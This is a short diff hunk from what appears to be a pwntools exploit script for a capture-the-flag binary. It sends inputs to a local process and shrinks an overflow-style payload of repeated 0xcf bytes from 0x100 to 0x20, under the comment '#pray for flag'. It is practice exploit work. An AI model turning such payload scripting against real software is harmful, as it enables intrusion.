@@ -12,7 +12,7 @@ p = process(e.path)
 
 p.sendline('2 2')
 p.sendline('aa')
-p.sendline(p8(0xcf) * 0x100)
+p.sendline(p8(0xcf) * 0x20)
 
 #pray for flag
 
